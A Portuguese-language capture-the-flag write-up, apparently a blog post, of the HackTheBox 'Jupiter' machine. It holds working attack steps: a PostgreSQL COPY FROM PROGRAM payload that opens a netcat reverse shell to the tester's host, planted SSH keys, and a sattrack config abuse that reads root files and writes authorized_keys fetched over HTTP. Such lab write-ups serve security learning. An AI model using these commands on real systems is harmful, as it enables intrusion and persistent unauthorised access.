---
layout: post
title: HackTheBox - Jupiter Writeup
date: 2023-10-21
categories: [Capture The Flag]
tags: [ctf, jupyter-notebook, sattrack, grafana, postgresql, cve-2019-9193]     # TAG names should always be lowercase
permalink: "/ctf/hackthebox-jupiter/"
---
<p align="left"><img width="280" height="280" src="https://www.hackthebox.com/storage/avatars/a11b7f2db639a97bcece9b65a6c1409c.png" alt="Jupiter"/></p>

## Enumaration
## Nmap

Vamos usar o nmap para descobrir quais as portas estão abertas e quais serviços estão disponíveis.

```bash
┌──(c4st13l㉿0x00)-[~/HTB/Jupiter]
└─$ cat nmap/initial-scan.nmap
# Nmap 7.93 scan initiated Mon Jun  5 22:23:54 2023 as: nmap -v -sV -Pn -sC -T4 -oA nmap/initial-scan 10.10.11.216
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA)
|_  256 6001d7db927b13f0ba20c6c900a71b41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

Temos duas portas abertas, 22 SSH e 80 HTTP.
Precisamos adicionar o domínio **jupiter.htb** ao arquivo **/etc/hosts**.

```bash
/etc/host
10.10.11.216 jupiter.htb
```

## Port 80 HTTP (nginx 1.18.0)

Na página principal não há nada de interessante.

![image](/assets/img/post/jupiter/2.png)

## Gobuster

Usando o **gobuster** para tentar descobrir algum arquivo interessante, porém não há nada que nos ajude aqui. 

```bash
┌──(c4st13l㉿0x00)-[~/HTB/Jupiter]
└─$ gobuster dir -u http://jupiter.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -t60 -b 403,404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jupiter.htb/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 19680]
/contact.html         (Status: 200) [Size: 10141]
/.                    (Status: 200) [Size: 19680]
/about.html           (Status: 200) [Size: 12613]
/services.html        (Status: 200) [Size: 11969]
/portfolio.html       (Status: 200) [Size: 11913]
Progress: 17129 / 17130 (99.99%)
===============================================================
Finished
===============================================================
```

Ao enumerar o subdomínio, foi possível encontrar um chamado **kiosk**.

```bash
┌──(c4st13l㉿0x00)-[~/HTB/Jupiter]
└─$ gobuster vhost -u jupiter.htb -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -t60                     
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://jupiter.htb
[+] Method:          GET
[+] Threads:         60
[+] Wordlist:        /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/06/10 18:58:35 Starting gobuster in VHOST enumeration mode
===============================================================
Found: kiosk.jupiter.htb Status: 200 [Size: 34390]
```

Temos que adicionar o subdomínio ao no arquivo de **hosts**.

```bash
/etc/hosts
10.10.11.216 jupiter.htb kiosk.jupiter.htb
```

## kiosk

Na página inicial vemos uma informação muito importante, o tipo de banco de dados e a query.

![image](/assets/img/post/jupiter/1.png)

```json
{
  "datasource": {
    "type": "postgres",
    "uid": "YItSLg-Vz"
  },
  "fieldConfig": {
    "defaults": {
      "mappings": [],
      "thresholds": {
        "mode": "percentage",
        "steps": [
          {
            "color": "green",
            "value": null
          },
          {
            "color": "orange",
            "value": 70
          },
          {
            "color": "red",
            "value": 85
          }
        ]
      },
      "color": {
        "mode": "thresholds"
      }
    },
    "overrides": []
  },
  "gridPos": {
    "h": 8,
    "w": 12,
    "x": 12,
    "y": 15
  },
  "id": 22,
  "options": {
    "reduceOptions": {
      "values": false,
      "calcs": [
        "lastNotNull"
      ],
      "fields": ""
    },
    "orientation": "auto",
    "textMode": "auto",
    "colorMode": "value",
    "graphMode": "area",
    "justifyMode": "auto"
  },
  "pluginVersion": "9.5.2",
  "targets": [
    {
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "editorMode": "code",
      "format": "table",
      "hide": false,
      "rawQuery": true,
      "rawSql": "select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Saturn';",
      "refId": "A",
      "sql": {
        "columns": [
          {
            "parameters": [],
            "type": "function"
          }
        ],
        "groupBy": [
          {
            "property": {
              "type": "string"
            },
            "type": "groupBy"
          }
        ],
        "limit": 50
      }
    }
  ],
  "title": "Number of Moons",
  "type": "stat"
}
```

## Burp

Vamos usar o burp para facilitar a visualização, podemos manipular a query, conseguimos ver a quantidade de lua que cada planeta possui, nesse caso vemos que **Uranus** possui 23 luas.

![image](/assets/img/post/jupiter/3.png)

Quando escolhemos **Jupiter** ele nos retorna a quantidade de lua que existe, 77 luas. 

![image](/assets/img/post/jupiter/4.png)

## Exploitation
## Command Injection CVE-2019-9193

**postgresql**

```bash
DROP TABLE IF EXISTS cmd_exec
CREATE TABLE cmd_exec(cmd_output text)
COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.2 9001 >/tmp/f'; 
SELEC * from cmd_exec
```

Iniciamos nosso **netcat** para receber uma conexão.

![image](/assets/img/post/jupiter/6.png)

Toda hora perdemos a nossa shell, por isso devemos criar uma chave ssh, para isso vamos usar **ssh-keygen**.
A seguir criamos o arquivo **authorized_keys** e copiamos o **id_rsa.pub** para dentro de **authorized_keys**.

Após isso vamos ter os seguintes arquivos.

```bash
postgres@jupiter:/var/lib/postgresql/.ssh$ ls -la
ls -la
total 20
drwx------ 2 postgres postgres 4096 Oct 17 13:57 .
drwxr-xr-x 6 postgres postgres 4096 Oct 17 14:03 ..
-rw------- 1 postgres postgres  569 Oct 17 13:57 authorized_keys
-rw------- 1 postgres postgres 2655 Oct 17 13:54 id_rsa
-rw------- 1 postgres postgres  570 Oct 17 13:54 id_rsa.pub
```

```bash
postgres@jupiter:/var/lib/postgresql/.ssh$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVjpp2EZOXJBr8xLM+/My0+UqBB/Elj5tiJq+qpPr7I47dQwtLCqVdfSg+xIwBDIF+Y3Pm5nNAyuFuhKw0CoylcDwn9Ttm6S/Hl0zSULXpOzG+OpRuS27Tdkm615Tcj4Oua6If+6NEWsyTiewS+WkY5uwGFcwHSH2IV27zMFFDbiu2tnFcw7sSlG5HpgeRA5IsLTzLOsZGMw5bgYObPhaV30rztmoC00C0di4dISQUpUx0RIrQGyqkWRx2EfpziFwJWZaNj/z0i66xKEDMgpnScVGzA0/97SZZb4CNHYo6P0LE2Y2iwHUG/BJLcydnNrzd2+J8RCnEoJNR5y7gjDNN7MFYfFgcW3Gm07fAkCxXvYhlbbahTdt1Ebxp1GvoSXGFnCfSB4ZnYmmJo2NenW+oUGkQxYkY0yZBcexxbV+hgBKMyF0XjwZjj3cro1r42eJ9urRlUUHLWJmuPwpFkgjPIxV//LVSaAx1K+daXJ37qPknelq5GsK+hE9kbK4fKsU= postgres@jupiter
```

```bash
postgres@jupiter:/var/lib/postgresql/.ssh$ echo -n "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVjpp2EZOXJBr8xLM+/My0+UqBB/Elj5tiJq+qpPr7I47dQwtLCqVdfSg+xIwBDIF+Y3Pm5nNAyuFuhKw0CoylcDwn9Ttm6S/Hl0zSULXpOzG+OpRuS27Tdkm615Tcj4Oua6If+6NEWsyTiewS+WkY5uwGFcwHSH2IV27zMFFDbiu2tnFcw7sSlG5HpgeRA5IsLTzLOsZGMw5bgYObPhaV30rztmoC00C0di4dISQUpUx0RIrQGyqkWRx2EfpziFwJWZaNj/z0i66xKEDMgpnScVGzA0/97SZZb4CNHYo6P0LE2Y2iwHUG/BJLcydnNrzd2+J8RCnEoJNR5y7gjDNN7MFYfFgcW3Gm07fAkCxXvYhlbbahTdt1Ebxp1GvoSXGFnCfSB4ZnYmmJo2NenW+oUGkQxYkY0yZBcexxbV+hgBKMyF0XjwZjj3cro1r42eJ9urRlUUHLWJmuPwpFkgjPIxV//LVSaAx1K+daXJ37qPknelq5GsK+hE9kbK4fKsU= postgres@jupiter" > authorized_keys
```

Agora copiamos o arquivo **id_rsa** para nossa máquina local, a seguir temos que dar permissão **600** para o arquivo e depois fazer a autenticação usando a chave privada.

```bash
chmod 600 id_rsa
ssh -i id_rsa postgres@jupiter.htb
```

## Lateral Movement

Primeiramente vamos fazer upload do binário **pspy32** para a vitima, podemos fazer isso usando um servidor python.

![image](/assets/img/post/jupiter/8.png)

Através do monitoramento foi possível ver algumas informações importantes.

![image](/assets/img/post/jupiter/11.png)

Analisando o diretório **/dev/shm** vemos 3 arquivos, porém temos permissão de escrita no arquivo **network-simulation.yml**.

```bash
postgres@jupiter:/dev/shm$ ls -la
total 32
drwxrwxrwt  3 root     root       100 Oct 17 14:54 .
drwxr-xr-x 20 root     root      4020 Oct 17 10:53 ..
-rw-rw-rw-  1 juno     juno       815 Mar  7  2023 network-simulation.yml
-rw-------  1 postgres postgres 26976 Oct 17 10:53 PostgreSQL.2631638662
drwxrwxr-x  3 juno     juno       100 Oct 17 14:54 shadow.data
```

Primeiro  copiamos o bash para dentro da pasta /tmp.

![image](/assets/img/post/jupiter/12.png)

A seguir vemos que o comando foi executado.

![image](/assets/img/post/jupiter/13.png)

Então damos permissão para o arquivo.

![image](/assets/img/post/jupiter/14.png)

Agora somos o usuário **juno**.

```bash
postgres@jupiter:/dev/shm$ /tmp/bash -p
bash-5.1$ id
uid=114(postgres) gid=120(postgres) euid=1000(juno) groups=120(postgres),119(ssl-cert)
```

Precisamos melhorar a shell, vamos começar gerando nossa chave, desta vez temos que fazer isso em nossa máquina local.

```bash
┌──(c4st13l㉿0x00)-[~/HTB/Jupiter/ssh]
└─$ ssh-keygen           
Generating public/private rsa key pair.
Enter file in which to save the key (/home/c4st13l/.ssh/id_rsa): //home/c4st13l/HTB/Jupiter/ssh/id_rsa      
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in //home/c4st13l/HTB/Jupiter/ssh/id_rsa
Your public key has been saved in //home/c4st13l/HTB/Jupiter/ssh/id_rsa.pub
The key fingerprint is:
SHA256:0dX1wsRCF4tveofGNYL9JmozVOMPhKjKzpmJ/bRysqc c4st13l@0x00
The key's randomart image is:
+---[RSA 3072]----+
|           .oo+o.|
|         . ..=o..|
|        . o o.+ .|
|         o .o= . |
|        S  .+o+..|
|       .   . *oo.|
|    . ..  . ..Bo.|
|    +==o.  +.ooo |
|   ..EOo  ..o    |
+----[SHA256]-----+
```

Copiamos todo o conteúdo do arquivo **id_rsa.pub**, e adicionamos dentro do arquivo **authorized_keys**.

```bash
bash-5.1$ echo -n "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgNtPRnY4e0dICMsHbpc8m+lY6KzarHzMHIxToW7jinpVYG0ozZmIFzBuXIvslyf3dhdcn4cw2sSkS6kdAzZZZghPVOfqTpQJ0EdqL9pzffH+2NZihxYdIgIQDrHYsKQ6gR1pAYOj2uA69fs8jNDELv+VWbUri9IOtlOhT4rbmFTCmdwrDpFmRkMx4DRrx7qlG69Tz8dtbG3EX+Ttn4KTPtHOIyXSJrEDvDnb/w+xQgnGKaTsXXkqpO253U2BmJTZv5UlUhsndcO7Bt2KS64ePkyFLmKFeM3eepTzX0kH+S2a+obXZsTyzURio0rjlxePXFlbR1tpz3eu/PRNKsI2qqx41Ff03I6E3B0eDY36wWLEjaO6Q9m7zPVew6lCE2QIf2rD0N9TeHqXdPSPlncUzx7Tz9ATKRM71ZUOglG2/RX6ZPMqStN2d578IOjGlxbwa4u6Uu4vuEwF+NsQ42hapGupmG4SM9CuTJWJSoK+rLb/PYokoxm9VEKBAzzKl4d0= c4st13l@0x00" > authorized_keys
```

Em nossa máquina local damos permissão **600** no **id_rsa**.

```bash
┌──(c4st13l㉿0x00)-[~/HTB/Jupiter/ssh]
└─$ chmod 600 id_rsa
```

A seguir basta logar.

```bash
┌──(c4st13l㉿0x00)-[~/HTB/Jupiter/ssh]
└─$ ssh juno@10.10.11.216 -i id_rsa
```

## Flag User

```bash
juno@jupiter:~$ cat user.txt 
2ace5f2ef059526a632bb9a5da8b0a63
```

## Shell com Jovian

O usuário faz parte de um grupo chamado **science**.

```bash
juno@jupiter:~$ id
uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)
```

Voltamos a usar o pspy32 para analisar os processos, e vemos um jupyter-notebook sendo executado. O notebook Jupyter é uma plataforma de computação interativa baseada na web. É frequentemente usado para aprendizado de máquina, ciência de dados, etc. Ele é executado localmente em **127.0.0.1:8888** por padrão.

![image](/assets/img/post/jupiter/9.png)

Ao analisar as portas abertas na máquina local, vemos que realmente existe uma porta **8888** aberta.

![image](/assets/img/post/jupiter/10.png)

## Port Forwarding com SSH

Para ter acesso a porta 8888, precisamos fazer port forwarding, para isso vamos usar o seguinte comando:

```bash
ssh -L 8888:127.0.0.1:8888 juno@10.10.11.216 -i id_rsa
```

Agora temos acesso a porta 8888.

![image](/assets/img/post/jupiter/15.png)

Dentro do diretório **logs** procuramos por token.

```bash
juno@jupiter:/opt/solar-flares/logs$ cat * | grep -i "token"
```
![image](/assets/img/post/jupiter/16.png)

Com o valor do token conseguimos acessar a página, a seguir vamos acessar o arquivo **flares.ipynb**.

![image](/assets/img/post/jupiter/17.png)

Podemos executar comandos, use o seguinte comando para receber uma conexão no netcat.

![image](/assets/img/post/jupiter/18.png)

Agora somos usuário **Jovian**.

![image](/assets/img/post/jupiter/19.png)

## Privilege Escalation

O usuário Jovian possui permissão para executar **sattrack** como root.

```bash
jovian@jupiter:/opt/solar-flares$ sudo -l
sudo -l
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```

Ao tentar executar o sattrack ele retorna o seguinte erro:

```bash
Satellite Tracking System
Configuration file has not been found. Please try again!
```

Então vamos analisar com **strace**.

```bash
jovian@jupiter:~$ strace /usr/local/bin/sattrack
```

Ele está procurando por um arquivo **config.json** no diretório /tmp/.

![image](/assets/img/post/jupiter/20.png)

Podemos procurar esse arquivo usando find, e conseguimos encontrar, agora precisamos copiar **/usr/local/share/sattrack/config.json** para /tmp/.

```bash
jovian@jupiter:/tmp$ find / -name config.json 2>/dev/null
find / -name config.json 2>/dev/null
/usr/local/share/sattrack/config.json
/usr/local/lib/python3.10/dist-packages/zmq/utils/config.json
/tmp/config.json
```

Vamos fazer as seguintes alterações no arquivo, o que estamos fazendo aqui é copiar o arquivo file:////root/root.txt para dentro de **"tleroot": "/tmp/"**, a seguir é só executar sattrack como root.

```json
"tleroot": "/tmp/",
        "tlefile": "root.txt",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "file:////root/root.txt",
                "http://celestrak.org/NORAD/elements/weather.txt",
                "http://celestrak.org/NORAD/elements/noaa.txt",
                "http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
        ],
```

E temos a nossa flag.

```bash
jovian@jupiter:/tmp$ cat root.txt
fb6d7c9d4ee547ccb5638101e069ae15
```

## Shell com root

Para ter uma shell com root temos que fazer as seguintes alterações no arquivo **config.json**.

```bash
jovian@jupiter:/tmp$ cat config.json 
{                                         
        "tleroot": "/root/.ssh/",
        "tlefile": "authorized_keys",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",
                                          
        "tlesources": [
                "http://10.10.14.4:8000/authorized_keys",
```

Usando um servidor python para que o upload do arquivo seja feito.

![image](/assets/img/post/jupiter/21.png)

Por fim acessamos via ssh usando id_rsa.

```bash
┌──(c4st13l㉿0x00)-[~/HTB/Jupiter/ssh]                                                                                                                                     
└─$ ssh -i id_rsa root@jupiter.htb
```

## Root Flag

```bash
root@jupiter:~# id
uid=0(root) gid=0(root) groups=0(root)
root@jupiter:~# cat root.txt 
fb6d7c9d4ee547ccb5638101e069ae15
```